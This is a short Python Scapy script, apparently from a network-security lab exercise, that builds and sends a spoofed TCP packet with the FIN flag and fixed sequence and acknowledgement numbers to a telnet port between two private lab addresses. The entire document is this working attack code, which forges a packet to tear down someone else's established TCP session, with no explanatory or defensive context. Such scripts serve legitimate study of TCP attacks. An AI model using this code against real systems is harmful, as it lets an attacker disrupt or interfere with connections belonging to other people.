#!/usr/bin/python
from scapy.all import *

ip = IP(src="10.0.2.5",dst="10.0.2.6")
tcp = TCP(sport=39233,dport=23,flags="F",seq=3463666582,ack=1845868498)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)
